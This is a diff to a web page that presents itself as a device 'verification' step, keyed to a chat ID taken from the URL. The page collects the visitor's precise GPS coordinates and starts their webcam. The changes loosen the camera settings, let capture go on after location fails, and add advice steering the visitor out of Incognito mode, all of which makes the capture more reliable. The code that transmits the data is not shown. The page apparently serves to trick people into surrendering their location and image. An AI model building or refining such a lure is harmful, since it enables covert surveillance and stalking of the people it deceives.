@@ -34,7 +34,7 @@
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
         button:hover { background: #00b386; color: white; }
         
-        .error-page { font-size: 18px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; }
+        .error-page { font-size: 16px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; text-align: left; }
     </style>
 </head>
 <body>
@@ -61,11 +61,17 @@
         const status = document.getElementById('status');
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        function showError(msg) {
+        function showError(errName, errMessage) {
             app.innerHTML = `<div class="error-page">
-                <p>⚠️ ${msg || "Verification failed or permissions denied."}</p>
-                <p style="font-size: 14px; color: #aaa; margin-top: 10px;">Please ensure you are using HTTPS and have allowed camera/location permissions in your browser settings.</p>
-                <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px;">Retry</button>
+                <p>⚠️ <b>Error Type:</b> ${errName || 'UnknownError'}</p>
+                <p>💬 <b>Details:</b> ${errMessage || 'Camera could not be initialized.'}</p>
+                <p style="font-size: 14px; color: #aaa; margin-top: 10px;">
+                   💡 <b>Troubleshooting:</b><br>
+                   1. Check if another app (Zoom, Teams, WeChat) is using the camera.<br>
+                   2. Try exiting Incognito Mode (some browsers block media in incognito).<br>
+                   3. Ensure your browser has permission for cameras.
+                </p>
+                <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px; display:block; width:100%;">Retry</button>
             </div>`;
         }
 
@@ -90,24 +96,23 @@
             }
             startBtn.style.display = 'none';
 
-            // 1. 优化定位：增加容错，避免因定位失败直接中断整个流程
+            // 1. 获取定位（加了容错，失败不卡死）
             let locationText = "Location not available";
             try {
                 status.innerText = "Verifying device location node 📍";
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                 });
                 locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
             } catch (err) {
                 console.warn("Geolocation warning:", err);
-                locationText = "Location permission denied or timeout";
-                // 此处选择继续执行，不直接阻断摄像头拍照
             }
 
-            // 2. 初始化摄像头
+            // 2. 初始化摄像头（放宽限制条件，兼容更多PC设备）
             try {
                 status.innerText = "Initializing camera sensor...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+                // 使用最基础的 true 参数，允许浏览器自动匹配默认摄像头，避免分辨率不匹配报错
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
                 videoContainer.style.display = 'block';
 
@@ -130,8 +135,8 @@
                 });
 
             } catch (err) {
-                console.warn("Camera error:", err);
-                showError("Camera permission denied or hardware not supported.");
+                console.error("Camera error details:", err);
+                showError(err.name, err.message);
             }
         });
 
